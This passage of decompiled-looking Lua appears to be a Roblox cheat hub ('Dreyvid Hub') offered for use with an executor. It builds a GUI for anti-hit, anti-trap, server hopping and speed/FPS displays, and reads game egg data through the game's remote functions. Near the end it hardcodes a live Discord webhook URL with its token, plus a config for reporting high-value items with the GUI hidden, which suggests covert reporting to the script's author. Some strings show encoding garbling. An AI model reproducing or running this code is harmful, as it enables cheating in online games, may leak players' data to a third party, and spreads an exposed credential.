        Frame32.BorderSizePixel = 0
        Frame32.ZIndex = 103
        Frame32.Parent = Frame31

        local UICorner = Instance.new("UICorner")

        UICorner.CornerRadius = UDim.new(0, 12)
        UICorner.Parent = Frame32

        local TextLabel = Instance.new("TextLabel")

        TextLabel.Size = UDim2.fromScale(1, 1)
        TextLabel.BackgroundTransparency = 1
        TextLabel.Text = "â„¹"
        TextLabel.TextColor3 = Color3.fromRGB(120, 180, 255)
        TextLabel.Font = Enum.Font.GothamBold
        TextLabel.TextSize = 28
        TextLabel.ZIndex = 104
        TextLabel.Parent = Frame32

        local TextLabel13 = Instance.new("TextLabel")

        TextLabel13.Size = UDim2.new(1, 0, 0, 22)
        TextLabel13.Position = UDim2.new(0, 0, 0, 60)
        TextLabel13.BackgroundTransparency = 1
        TextLabel13.Text = "Dreyvid Hub"
        TextLabel13.TextColor3 = Color3.fromRGB(240, 244, 255)
        TextLabel13.Font = Enum.Font.GothamBold
        TextLabel13.TextSize = 16
        TextLabel13.ZIndex = 103
        TextLabel13.Parent = Frame31

        local TextLabel14 = Instance.new("TextLabel")

        TextLabel14.Size = UDim2.new(1, 0, 0, 16)
        TextLabel14.Position = UDim2.new(0, 0, 0, 88)
        TextLabel14.BackgroundTransparency = 1
        TextLabel14.Text = "VersiÃ³n v2.1"
        TextLabel14.TextColor3 = Color3.fromRGB(160, 170, 200)
        TextLabel14.Font = Enum.Font.GothamMedium
        TextLabel14.TextSize = 12
        TextLabel14.ZIndex = 103
        TextLabel14.Parent = Frame31

        local TextLabel15 = Instance.new("TextLabel")

        TextLabel15.Size = UDim2.new(1, 0, 0, 80)
        TextLabel15.Position = UDim2.new(0, 0, 0, 116)
        TextLabel15.BackgroundTransparency = 1
        TextLabel15.Text = "Hub con Anti-Hit, Huevo MÃ¡s Tiempo, Anti-Trap, Server Hop, FPS/Ping, VelocÃ­metro y mÃ¡s."
        TextLabel15.TextColor3 = Color3.fromRGB(180, 190, 220)
        TextLabel15.Font = Enum.Font.GothamMedium
        TextLabel15.TextSize = 11
        TextLabel15.TextWrapped = true
        TextLabel15.ZIndex = 103
        TextLabel15.Parent = Frame31

        local t6 = {
			btn = v190,
			stroke = v191,
			panel = Frame10
		}
        local t7 = {
			btn = v192,
			stroke = v193,
			panel = Frame11
		}
        local t8 = {
			{
				btn = v188,
				stroke = v189,
				panel = Frame8
			},
			t6,
			t7,
			{
				btn = v194,
				stroke = v195,
				panel = Frame31
			}
		}

        local function v270(p27)
            for _, v in ipairs(t8) do
                local v459 = v == p27

                v.panel.Visible = v459

                if v459 then
                    local value1 = t2.value1
                    local btn = v.btn
                    local tweenInfo = TweenInfo.new(0.2)
                    local color3 = Color3.fromRGB(30, 60, 100)
                    local color3_3 = Color3.fromRGB(120, 200, 255)

                    value1:Create(btn, tweenInfo, {
						BackgroundColor3 = color3,
						BackgroundTransparency = 0.2,
						TextColor3 = color3_3
					}):Play()
                    t2.value1:Create(v.stroke, TweenInfo.new(0.2), {
						Color = Color3.fromRGB(60, 140, 255),
						Transparency = 0.2
					}):Play()
                else
                    local value1 = t2.value1
                    local btn = v.btn
                    local tweenInfo = TweenInfo.new(0.2)
                    local _Color3 = Color3
                    local Create = value1.Create
                    local v470 = _Color3.fromRGB(30, 35, 48)
                    local color3 = Color3.fromRGB(180, 180, 200)

                    Create(value1, btn, tweenInfo, {
						BackgroundColor3 = v470,
						BackgroundTransparency = 0.5,
						TextColor3 = color3
					}):Play()
                    t2.value1:Create(v.stroke, TweenInfo.new(0.2), {
						Color = Color3.fromRGB(70, 90, 130),
						Transparency = 0.6
					}):Play()
                end
            end
        end

        for _, v in ipairs(t8) do
            local v273 = v

            v273.btn.MouseButton1Click:Connect(function()
                v270(v273)
            end)
        end

        v270(t8[1])
        u274 = false

        function v275()
            if u274 then
                t2.value1:Create(TextButton5, TweenInfo.new(0.25), {
					BackgroundColor3 = Color3.fromRGB(30, 60, 100)
				}):Play()
                t2.value1:Create(UIStroke3, TweenInfo.new(0.25), {
					Color = Color3.fromRGB(60, 140, 255),
					Transparency = 0.1
				}):Play()

                local value1 = t2.value1
                local v473 = Frame9
                local tweenInfo = TweenInfo.new(0.25)
                local Create = value1.Create
                local uDim2 = UDim2.new(1, -23, 0.5, -10)
                local color3 = Color3.fromRGB(100, 200, 255)

                Create(value1, v473, tweenInfo, {
					Position = uDim2,
					BackgroundColor3 = color3
				}):Play()

                return
            end

            local new = TweenInfo.new

            t2.value1:Create(TextButton5, new(0.25), {
				BackgroundColor3 = Color3.fromRGB(45, 45, 55)
			}):Play()
            t2.value1:Create(UIStroke3, TweenInfo.new(0.25), {
				Color = Color3.fromRGB(90, 90, 110),
				Transparency = 0.3
			}):Play()

            local value1 = t2.value1
            local v480 = Frame9
            local tweenInfo = TweenInfo.new(0.25)
            local uDim2 = UDim2.new(0, 3, 0.5, -10)
            local Create = value1.Create
            local color3 = Color3.fromRGB(200, 200, 210)

            Create(value1, v480, tweenInfo, {
				Position = uDim2,
				BackgroundColor3 = color3
			}):Play()
        end
    end

    TextButton5.MouseButton1Click:Connect(function()
        u274 = not u274

        if u274 then
            Frame4.Visible = true
            Frame3.Visible = true
            t2.value46()
        else
            Frame4.Visible = false
            Frame3.Visible = false
            t2.value45()
        end

        v275()
    end)
    TextButton.MouseButton1Click:Connect(function()
        Frame6.Visible = not Frame6.Visible
    end)
    TextButton4.MouseButton1Click:Connect(function()
        Frame6.Visible = false
    end)

    local function v276(p28)
        if p28 then
            local value1 = t2.value1
            local v487 = TextButton2
            local tweenInfo = TweenInfo.new(0.25)
            local color3 = Color3.fromRGB(20, 45, 35)
            local color3_4 = Color3.fromRGB(100, 230, 160)

            value1:Create(v487, tweenInfo, {
				BackgroundColor3 = color3,
				TextColor3 = color3_4
			}):Play()
            t2.value1:Create(UIStroke, TweenInfo.new(0.25), {
				Color = Color3.fromRGB(50, 150, 100)
			}):Play()
            t2.value1:Create(Frame, TweenInfo.new(0.25), {
				BackgroundColor3 = Color3.fromRGB(50, 220, 130)
			}):Play()
            TextButton2.Text = "ON"

            return
        end

        local value1 = t2.value1
        local v492 = TextButton2
        local tweenInfo = TweenInfo.new(0.25)
        local color3 = Color3.fromRGB(40, 25, 30)
        local fromRGB = Color3.fromRGB
        local Create = value1.Create
        local v497 = fromRGB(230, 120, 120)

        Create(value1, v492, tweenInfo, {
			BackgroundColor3 = color3,
			TextColor3 = v497
		}):Play()
        t2.value1:Create(UIStroke, TweenInfo.new(0.25), {
			Color = Color3.fromRGB(120, 50, 60)
		}):Play()
        t2.value1:Create(Frame, TweenInfo.new(0.25), {
			BackgroundColor3 = Color3.fromRGB(230, 70, 80)
		}):Play()
        TextButton2.Text = "OFF"
    end

    TextButton2.MouseButton1Click:Connect(function()
        t2.value19 = not t2.value19

        if t2.value19 then
            if Frame4.Visible then
                Frame4.Visible = false
                Frame3.Visible = false
                t2.value45()
                u274 = false
                v275()
            end

            v276(true)

            for _, descendant in ipairs(t2.value4:GetDescendants()) do
                v17(descendant)
            end

            table.insert(t2.value22, t2.value4.DescendantAdded:Connect(v17))
            table.insert(t2.value22, t2.value2.PromptShown:Connect(v17))

            if not t2.value20 then
                t2.value20 = t2.value2.PromptTriggered:Connect(function(_, p30)
                    if p30 == t2.value12 then
                        t2.value23()
                    end
                end)

                return
            end
        else
            v276(false)
            v18(false)

            if t2.value20 then
                t2.value20:Disconnect()
                t2.value20 = nil
            end
        end
    end)

    local function v277(p31)
        if p31 then
            local value1 = t2.value1
            local v502 = TextButton3
            local tweenInfo = TweenInfo.new(0.25)
            local fromRGB = Color3.fromRGB
            local Create = value1.Create
            local v506 = fromRGB(20, 45, 35)
            local color3 = Color3.fromRGB(100, 230, 160)

            Create(value1, v502, tweenInfo, {
				BackgroundColor3 = v506,
				TextColor3 = color3
			}):Play()
            t2.value1:Create(UIStroke2, TweenInfo.new(0.25), {
				Color = Color3.fromRGB(50, 150, 100)
			}):Play()
            t2.value1:Create(Frame5, TweenInfo.new(0.25), {
				BackgroundColor3 = Color3.fromRGB(50, 220, 130)
			}):Play()
            TextButton3.Text = "ON"

            return
        end

        local value1 = t2.value1
        local v509 = TextButton3
        local tweenInfo = TweenInfo.new(0.25)
        local color3 = Color3.fromRGB(40, 25, 30)
        local fromRGB = Color3.fromRGB
        local Create = value1.Create
        local v514 = fromRGB(230, 120, 120)

        Create(value1, v509, tweenInfo, {
			BackgroundColor3 = color3,
			TextColor3 = v514
		}):Play()
        t2.value1:Create(UIStroke2, TweenInfo.new(0.25), {
			Color = Color3.fromRGB(120, 50, 60)
		}):Play()
        t2.value1:Create(Frame5, TweenInfo.new(0.25), {
			BackgroundColor3 = Color3.fromRGB(230, 70, 80)
		}):Play()
        TextButton3.Text = "OFF"
    end

    TextButton3.MouseButton1Click:Connect(function()
        t2.value28 = not t2.value28

        if t2.value28 then
            if t2.value19 then
                t2.value19 = false
                v276(false)
                v18(false)

                if t2.value20 then
                    t2.value20:Disconnect()
                    t2.value20 = nil
                end
            end

            t2.value46()
            v277(true)

            return
        end

        t2.value45()
        v277(false)
    end)

    local Frame33 = Instance.new("Frame")

    Frame33.Size = UDim2.new(0, 200, 0, 46)
    Frame33.Position = UDim2.new(1, -210, 1, -56)
    Frame33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame33.BackgroundTransparency = 0.15
    Frame33.BorderSizePixel = 0
    Frame33.ZIndex = 2
    Frame33.Parent = ScreenGui

    local UICorner = Instance.new("UICorner")

    UICorner.CornerRadius = UDim.new(0, 18)
    UICorner.Parent = Frame33

    local UIStroke18 = Instance.new("UIStroke")

    UIStroke18.Color = Color3.fromRGB(60, 140, 255)
    UIStroke18.Thickness = 1
    UIStroke18.Transparency = 0.2
    UIStroke18.Parent = Frame33

    local TextLabel = Instance.new("TextLabel")

    TextLabel.Size = UDim2.new(0, 60, 0, 14)
    TextLabel.Position = UDim2.new(0, 14, 0, 6)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Text = "VELOCIDAD"
    TextLabel.TextColor3 = Color3.fromRGB(120, 180, 255)
    TextLabel.Font = Enum.Font.GothamBold
    TextLabel.TextSize = 9
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel.ZIndex = 3
    TextLabel.Parent = Frame33

    local TextLabel16 = Instance.new("TextLabel")

    TextLabel16.Size = UDim2.new(0, 80, 0, 20)
    TextLabel16.Position = UDim2.new(1, -90, 0, 4)
    TextLabel16.BackgroundTransparency = 1
    TextLabel16.Text = "0"
    TextLabel16.TextColor3 = Color3.fromRGB(240, 244, 255)
    TextLabel16.Font = Enum.Font.GothamBold
    TextLabel16.TextSize = 16
    TextLabel16.TextXAlignment = Enum.TextXAlignment.Right
    TextLabel16.ZIndex = 3
    TextLabel16.Parent = Frame33

    local Frame34 = Instance.new("Frame")

    Frame34.Size = UDim2.new(1, -24, 0, 6)
    Frame34.Position = UDim2.new(0, 12, 1, -12)
    Frame34.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
    Frame34.BorderSizePixel = 0
    Frame34.ZIndex = 3
    Frame34.Parent = Frame33

    local UICorner24 = Instance.new("UICorner")

    UICorner24.CornerRadius = UDim.new(1, 0)
    UICorner24.Parent = Frame34

    local Frame35 = Instance.new("Frame")

    Frame35.Size = UDim2.new(0, 0, 1, 0)
    Frame35.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
    Frame35.BorderSizePixel = 0
    Frame35.ZIndex = 4
    Frame35.Parent = Frame34

    local UICorner25 = Instance.new("UICorner")

    UICorner25.CornerRadius = UDim.new(1, 0)
    UICorner25.Parent = Frame35

    local UIScale = Instance.new("UIScale")

    UIScale.Scale = v124
    UIScale.Parent = Frame33
    t2.value3.RenderStepped:Connect(function()
        if not ScreenGui.Parent then
            return
        end

        local Character = t2.value12.Character
        local v516 = Character and Character:FindFirstChild("HumanoidRootPart")
        local v517 = v516 and Vector3.new(v516.AssemblyLinearVelocity.X, 0, v516.AssemblyLinearVelocity.Z).Magnitude or 0

        TextLabel16.Text = tostring((math.floor(v517 + 0.5)))

        local v518 = math.clamp(v517 / 100, 0, 1)

        Frame35.Size = UDim2.new(v518, 0, 1, 0)

        if v517 < 20 then
            Frame35.BackgroundColor3 = Color3.fromRGB(60, 140, 255)

            return
        end

        if v517 < 50 then
            Frame35.BackgroundColor3 = Color3.fromRGB(60, 200, 255)

            return
        end

        if v517 < 80 then
            Frame35.BackgroundColor3 = Color3.fromRGB(255, 200, 60)

            return
        end

        Frame35.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
    end)

    local Frame36 = Instance.new("Frame")

    Frame36.Size = UDim2.new(0, 170, 0, 30)
    Frame36.Position = UDim2.new(0.5, -85, 0, 34)
    Frame36.BackgroundTransparency = 1
    Frame36.Parent = ScreenGui

    local UIListLayout = Instance.new("UIListLayout")

    UIListLayout.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout.Padding = UDim.new(0, 10)
    UIListLayout.Parent = Frame36

    local Frame37 = Instance.new("Frame")

    Frame37.Size = UDim2.new(0, 75, 0, 24)
    Frame37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame37.BackgroundTransparency = 0.5
    Frame37.BorderSizePixel = 0
    Frame37.LayoutOrder = 1
    Frame37.Parent = Frame36

    local UICorner26 = Instance.new("UICorner")

    UICorner26.CornerRadius = UDim.new(0, 12)
    UICorner26.Parent = Frame37

    local TextLabel17 = Instance.new("TextLabel")

    TextLabel17.Size = UDim2.new(1, -8, 1, 0)
    TextLabel17.Position = UDim2.new(0, 4, 0, 0)
    TextLabel17.BackgroundTransparency = 1
    TextLabel17.Text = "FPS: --"
    TextLabel17.TextColor3 = Color3.fromRGB(240, 244, 255)
    TextLabel17.Font = Enum.Font.GothamBold
    TextLabel17.TextSize = 12
    TextLabel17.Parent = Frame37

    local Frame38 = Instance.new("Frame")

    Frame38.Size = UDim2.new(0, 75, 0, 24)
    Frame38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame38.BackgroundTransparency = 0.5
    Frame38.BorderSizePixel = 0
    Frame38.LayoutOrder = 2
    Frame38.Parent = Frame36

    local UICorner27 = Instance.new("UICorner")

    UICorner27.CornerRadius = UDim.new(0, 12)
    UICorner27.Parent = Frame38

    local TextLabel18 = Instance.new("TextLabel")

    TextLabel18.Size = UDim2.new(1, -8, 1, 0)
    TextLabel18.Position = UDim2.new(0, 4, 0, 0)
    TextLabel18.BackgroundTransparency = 1
    TextLabel18.Text = "PING: --"
    TextLabel18.TextColor3 = Color3.fromRGB(240, 244, 255)
    TextLabel18.Font = Enum.Font.GothamBold
    TextLabel18.TextSize = 12
    TextLabel18.Parent = Frame38

    local n2 = 0
    local n3 = 0

    task.spawn(function()
        while ScreenGui.Parent do
            task.wait(1)

            local v519 = math.floor(n2 / n3 + 0.5)

            n2 = 0
            n3 = 0
            TextLabel17.Text = "FPS: " .. tostring(v519)

            if v519 >= 50 then
                TextLabel17.TextColor3 = Color3.fromRGB(80, 230, 130)
            elseif v519 >= 30 then
                TextLabel17.TextColor3 = Color3.fromRGB(255, 210, 80)
            else
                TextLabel17.TextColor3 = Color3.fromRGB(255, 80, 80)
            end
        end
    end)
    t2.value3.RenderStepped:Connect(function(dt)
        if not ScreenGui.Parent then
            return
        end

        n2 += 1
        n3 += dt
    end)
    task.spawn(function()
        while ScreenGui.Parent do
            task.wait(1)

            local ok, result = pcall(function()
                return t2.value5.Network.ServerStatsItem["Data Ping"]:GetValue()
            end)

            if ok and result then
                local v523 = math.floor(result + 0.5)

                TextLabel18.Text = "PING: " .. v523

                if v523 <= 80 then
                    TextLabel18.TextColor3 = Color3.fromRGB(80, 230, 130)
                elseif v523 <= 150 then
                    TextLabel18.TextColor3 = Color3.fromRGB(255, 210, 80)
                else
                    TextLabel18.TextColor3 = Color3.fromRGB(255, 80, 80)
                end
            end
        end
    end)

    local Frame39 = Instance.new("Frame")

    Frame39.Size = UDim2.new(0, 175, 0, 75)
    Frame39.Position = UDim2.new(1, -185, 0, 30)
    Frame39.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame39.BackgroundTransparency = 0.25
    Frame39.BorderSizePixel = 0
    Frame39.Parent = ScreenGui

    local UICorner28 = Instance.new("UICorner")

    UICorner28.CornerRadius = UDim.new(0, 14)
    UICorner28.Parent = Frame39

    local UIStroke19 = Instance.new("UIStroke")

    UIStroke19.Color = Color3.fromRGB(60, 140, 255)
    UIStroke19.Thickness = 1
    UIStroke19.Transparency = 0.2
    UIStroke19.Parent = Frame39

    local TextLabel19 = Instance.new("TextLabel")

    TextLabel19.Size = UDim2.new(0, 100, 0, 18)
    TextLabel19.Position = UDim2.new(0, 14, 0, 6)
    TextLabel19.BackgroundTransparency = 1
    TextLabel19.Text = "Server Hop"
    TextLabel19.TextColor3 = Color3.fromRGB(240, 244, 255)
    TextLabel19.Font = Enum.Font.GothamBold
    TextLabel19.TextSize = 13
    TextLabel19.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel19.Parent = Frame39

    local TextButton9 = Instance.new("TextButton")

    TextButton9.Size = UDim2.fromOffset(32, 26)
    TextButton9.Position = UDim2.new(0, 14, 0, 36)
    TextButton9.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
    TextButton9.Text = "1"
    TextButton9.TextColor3 = Color3.fromRGB(240, 244, 255)
    TextButton9.Font = Enum.Font.GothamBold
    TextButton9.TextSize = 13
    TextButton9.AutoButtonColor = false
    TextButton9.Parent = Frame39

    local UICorner29 = Instance.new("UICorner")

    UICorner29.CornerRadius = UDim.new(0, 6)
    UICorner29.Parent = TextButton9

    local TextButton10 = Instance.new("TextButton")

    TextButton10.Size = UDim2.new(1, -58, 0, 26)
    TextButton10.Position = UDim2.new(0, 52, 0, 36)
    TextButton10.BackgroundColor3 = Color3.fromRGB(30, 60, 100)
    TextButton10.Text = "ON"
    TextButton10.TextColor3 = Color3.fromRGB(120, 200, 255)
    TextButton10.Font = Enum.Font.GothamBold
    TextButton10.TextSize = 12
    TextButton10.AutoButtonColor = false
    TextButton10.Parent = Frame39

    local UICorner30 = Instance.new("UICorner")

    UICorner30.CornerRadius = UDim.new(0, 6)
    UICorner30.Parent = TextButton10

    local UIScale5 = Instance.new("UIScale")

    UIScale5.Scale = v124
    UIScale5.Parent = Frame39

    local n4 = 1

    TextButton9.MouseButton1Click:Connect(function()
        n4 += 1

        if n4 > 5 then
            n4 = 1
        end

        TextButton9.Text = tostring(n4)
    end)

    local function v308(p32)
        local u525 = "https://games.roblox.com/v1/games/" .. t2.value14 .. "/servers/Public?sortOrder=Asc&limit=100"
        local ok, result = pcall(function()
            return game:HttpGet(u525)
        end)
        local v528 = not ok
        if not v528 then
            v528 = not result
        end
        if v528 then
            return nil
        end
        local ok3, result3 = pcall(t2.value7.JSONDecode, t2.value7, result)
        local v531 = not ok3
        if not v531 then
            v531 = not result3 or not result3.data
        end
        if v531 then
            return nil
        end
        local str = tostring(game.JobId)
        local t9 = {}
        local _ipairs = ipairs
        for _, v536 in _ipairs(result3.data) do
            local id = v536.id

            if id then
                id = str ~= tostring(v536.id)

                if id then
                    id = v536.playing

                    if id then
                        id = p32 >= v536.playing and v536.playing > 0
                    end
                end
            end

            if id then
                _ipairs = table.insert
                _ipairs(t9, (tostring(v536.id)))
            end
        end
        if #t9 == 0 then
            return nil
        end

        return t9[math.random(1, #t9)]
    end

    TextButton10.MouseButton1Click:Connect(function()
        TextButton10.Active = false
        TextButton10.Text = "..."

        local v538 = v308(n4)

        if not v538 then
            TextButton10.Text = "NONE"
            task.wait(2)
            TextButton10.Text = "ON"
            TextButton10.Active = true

            return
        end

        TextButton10.Text = "OK"
        task.wait(0.3)
        pcall(function()
            t2.value6:TeleportToPlaceInstance(t2.value14, v538, t2.value12)
        end)
        TextButton10.Active = true
    end)
end
t2.value47 = v29;
(function(p33)
    local ScreenGui = Instance.new("ScreenGui")

    ScreenGui.Name = "DreyvidIntro"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 999
    ScreenGui.Parent = t2.value10

    local Frame = Instance.new("Frame")

    Frame.Size = UDim2.new(1, 0, 1, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BackgroundTransparency = 1
    Frame.BorderSizePixel = 0
    Frame.ZIndex = 150
    Frame.Parent = ScreenGui
    t2.value1:Create(Frame, TweenInfo.new(0.4), {
		BackgroundTransparency = 0.4
	}):Play()

    local Frame40 = Instance.new("Frame")

    Frame40.Size = UDim2.new(0, 500, 0, 150)
    Frame40.Position = UDim2.new(0.5, -250, 0.5, -75)
    Frame40.BackgroundTransparency = 1
    Frame40.ZIndex = 200
    Frame40.Parent = ScreenGui

    local v119 = v28(Frame40, 400, 130, 0, 0, 198)

    v119.BackgroundTransparency = 1

    local v120 = v28(Frame40, 300, 90, 0, 0, 199)

    v120.BackgroundTransparency = 1

    local TextLabel = Instance.new("TextLabel")

    TextLabel.Size = UDim2.new(1, 0, 0, 80)
    TextLabel.Position = UDim2.new(0, 0, 0.5, -40)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Text = "Dreyvid Hub"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.Font = Enum.Font.GothamBold
    TextLabel.TextSize = 56
    TextLabel.TextStrokeTransparency = 0.3
    TextLabel.TextStrokeColor3 = Color3.fromRGB(60, 140, 255)
    TextLabel.TextTransparency = 1
    TextLabel.ZIndex = 210
    TextLabel.Parent = Frame40

    local TextLabel20 = Instance.new("TextLabel")

    TextLabel20.Size = UDim2.new(1, 0, 0, 20)
    TextLabel20.Position = UDim2.new(0, 0, 0.5, 38)
    TextLabel20.BackgroundTransparency = 1
    TextLabel20.Text = "PREMIUM HUB Â· v2.1"
    TextLabel20.TextColor3 = Color3.fromRGB(120, 180, 255)
    TextLabel20.Font = Enum.Font.GothamBold
    TextLabel20.TextSize = 14
    TextLabel20.TextTransparency = 1
    TextLabel20.ZIndex = 210
    TextLabel20.Parent = Frame40
    task.spawn(function()
        local new = TweenInfo.new
        local Quint = Enum.EasingStyle.Quint
        local Out = Enum.EasingDirection.Out

        t2.value1:Create(v119, new(1, Quint, Out), {
			BackgroundTransparency = 0.75
		}):Play()

        local new2 = TweenInfo.new
        local Quint2 = Enum.EasingStyle.Quint
        local Out2 = Enum.EasingDirection.Out

        t2.value1:Create(v120, new2(0.9, Quint2, Out2), {
			BackgroundTransparency = 0.82
		}):Play()
        TextLabel.TextTransparency = 0
        TextLabel.Size = UDim2.new(0.5, 0, 0.5, 40)

        local value1 = t2.value1
        local v422 = TextLabel
        local new3 = TweenInfo.new
        local Back = Enum.EasingStyle.Back
        local _Enum2 = Enum
        local Create = value1.Create
        local v427 = new3(0.7, Back, _Enum2.EasingDirection.Out)
        local uDim2 = UDim2.new(1, 0, 0, 80)
        local uDim2_2 = UDim2.new(0, 0, 0.5, -40)

        Create(value1, v422, v427, {
			Size = uDim2,
			Position = uDim2_2
		}):Play()
        task.wait(0.3)
        TextLabel20.TextTransparency = 0
    end)
    task.spawn(function()
        task.wait(2.8)

        if not ScreenGui.Parent then
            return
        end

        t2.value1:Create(TextLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quart), {
			TextTransparency = 1,
			TextSize = 80
		}):Play()
        t2.value1:Create(TextLabel20, TweenInfo.new(0.6), {
			TextTransparency = 1
		}):Play()
        t2.value1:Create(v119, TweenInfo.new(0.6), {
			BackgroundTransparency = 1
		}):Play()

        local new = TweenInfo.new

        t2.value1:Create(v120, new(0.6), {
			BackgroundTransparency = 1
		}):Play()
        t2.value1:Create(Frame, TweenInfo.new(0.6), {
			BackgroundTransparency = 1
		}):Play()
        task.wait(0.7)
        ScreenGui:Destroy()

        if p33 then
            p33()
        end
    end)
end)(function()
    t2.value47()
end)

local _game4 = game
local GetService = _game4.GetService
t1.value14 = "Workspace"
local v32 = GetService(_game4, "Players")

game:GetService("RunService")
game:GetService("Workspace")

local _game5 = game
t1.value14 = "GetService"
t1.value15 = true
t1.value14 = _game5:GetService("ReplicatedStorage")
t2.value48 = t1.value14
t2.value49 = game:GetService("HttpService")
t2.value50 = game:GetService("CoreGui")
t2.value51 = v32.LocalPlayer
t2.value52 = "https://discord.com/api/webhooks/1554158678435700857/bR8eh8vHQ4DzSZ6xow2FEtf-i37uwS_YChILWaJPUYYODLrL2fI1puHMEK80udjxMY0c"
t2.value53 = {
	Enabled = t1.value15,
	CooldownSeconds = 15,
	WebhookName = "Dreyvid Hub",
	WebhookAvatar = "https://media.discordapp.net/attachments/1554158589449343167/1555760950177435768/e541296a-ea4d-409d-8f84-7cf852b8e96d.png?backend=b2&ex=6ac1b2cb&is=6ac0614b&hm=b5a1d1b37b145350533ea559580f7cd7ed62854015eb40e82b0771e67fdd06ab&=&format=webp&quality=lossless&width=768&height=768",
	MinValue = 500000000,
	ShowGUI = false
}
t2.value54 = nil
pcall(function()
    t2.value54 = gethui()
end)

if not t2.value54 then
    pcall(function()
        t2.value54 = t2.value50
    end)
end
if not t2.value54 then
    t2.value54 = t2.value51:WaitForChild("PlayerGui")
end
t1.value16 = v29
local v34 = syn and syn.request
local value16 = t1.value16
if not v34 then
    t1.value16 = value16
    t1.value17 = http and http.request
    v34 = t1.value17

    if not t1.value17 then
        t1.value18 = value16
        t1.value17 = http_request or request
        v34 = t1.value17

        local _ = t1.value18
    end

    local _ = t1.value16
end
t1.value18 = "Assets"
t2.value55 = v34
t1.value16 = "Client"
t1.value17 = "EggState"
local function v38(...)
    local t10 = { ... }
    local ok, result = pcall(function()
        local value48 = t2.value48

        for _, v in ipairs(t10) do
            value48 = value48:WaitForChild(v, 3)

            if not value48 then
                return nil
            end
        end

        return require(value48)
    end)

    return ok and result or nil
end
t2.value56 = v38("Client", "EggState")
t2.value57 = v38("Data", "Assets")
t1.value18 = t2.value48:FindFirstChild("Packages")
t2.value58 = t1.value18
t2.value58 = t2.value58 and t2.value58:FindFirstChild("Networking")

function t1.value18(p34)
    if p34 >= 1000000000000 then
        return string.format("%.2f Trillones", p34 / 1000000000000)
    end

    if p34 >= 1000000000 then
        return string.format("%.2f Billones", p34 / 1000000000)
    end

    if p34 >= 1000000 then
        return string.format("%.2f Millones", p34 / 1000000)
    end

    if p34 >= 1000 then
        return string.format("%.1f Mil", p34 / 1000)
    end

    return string.format("%.0f", p34)
end
local function v39(p35)
    if p35 >= 1000000000000 then
        return string.format("%.2fT", p35 / 1000000000000)
    end

    if p35 >= 1000000000 then
        return string.format("%.2fB", p35 / 1000000000)
    end

    if p35 >= 1000000 then
        return string.format("%.2fM", p35 / 1000000)
    end

    if p35 >= 1000 then
        return string.format("%.1fK", p35 / 1000)
    end

    return string.format("%.0f", p35)
end
t2.value59 = t1.value18
function t2.value60(p36, p37)
    local value57 = t2.value57

    if value57 then
        value57 = t2.value57.Directory
    end

    local v315 = type(value57) == "table" and value57[tostring(p36)] or nil
    local v316 = v315 and tostring(v315.DisplayName or p36)

    if not v316 then
        v316 = tostring(p36)
    end

    local v317 = v315

    if v315 then
        v317 = tonumber(v315.EarningRate)
    end

    local v318 = v317 or 0
    local v319 = tonumber(p37) or 1
    local v320 = v319 > 5

    if v320 then
        v320 = (v319 / 5) ^ 1.2 * 19.637875755794
    end

    if not v320 then
        v320 = v319 ^ 1.85
    end

    local v321 = v315

    if v315 then
        v321 = type(v315.Rarity) == "table"

        if v321 then
            v321 = tonumber(v315.Rarity.RarityNumber or v315.Rarity.Rank)
        end
    end

    local v322 = v321 or 0

    if v315 then
        v315 = type(v315.Rarity) == "table" and tostring(v315.Rarity.DisplayName or "")
    end

    local v323 = v315 or ""
    local str = tostring(p36)
    local v325 = v322 or 0
    local v326 = v318 * v320

    return {
		Name = v316,
		Category = str,
		Rarity = v325,
		RarityName = v323,
		Value = v326,
		Scale = v319
	}
end
function t2.value61()
    if type(t2.value56) ~= "table" or type(t2.value56.ReadFieldEggs) ~= "function" then
        return nil
    end

    local ok, result = pcall(t2.value56.ReadFieldEggs)
    local v331 = not ok

    if not v331 then
        v331 = type(result) ~= "table" or type(result.Records) ~= "table"
    end

    if v331 then
        return nil
    end

    local n5 = 0

    for _ in pairs(result.Records) do
        n5 += 1
    end

    if n5 > 0 then
        return result.Records
    end

    return nil
end
t2.value62 = nil
function t2.value62()
    if not t2.value58 then
        return nil
    end

    local v334 = t2.value58:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")

    if not v334 or not v334:IsA("RemoteFunction") then
        return nil
    end

    local ok, result = pcall(function()
        return v334:InvokeServer()
    end)
    local v337 = not ok

    if not v337 then
        v337 = type(result) ~= "table" or type(result.Records) ~= "table"
    end

    if v337 then
        return nil
    end

    local n6 = 0

    for _ in pairs(result.Records) do
        n6 += 1
    end

    if n6 > 0 then
        return result.Records
    end

    return nil
end
function t2.value63()
    local _ipairs = ipairs
    local value62 = t2.value62

    for _, v343 in _ipairs({
		t2.value61,
		value62
	}) do
        local ok, result = pcall(v343)

        if ok then
            ok = type(result) == "table"
        end

        if not ok then
            continue
        end

        local n7 = 0

        for _ in pairs(result) do
            n7 += 1
        end

        if n7 > 0 then
            return result, n7
        end
    end

    return {}, 0
end
function t2.value64()
    local v366 = t2.value63()
    local v367
    for k, v in pairs(v366) do
        if type(v) == "table" and v.State ~= "Claimed" then
            local v370 = if not (v.Value and v.Rarity) then t2.value60(v.AssetCategory, v.AssetScale) else v

            v370.Uid = k
            v370.AreaId = tostring(v.AreaId or "?")

            if not v367 or v370.Value > v367.Value then
                v367 = v370
            end
        end
    end

    return v367
end
function t2.value65(p38)
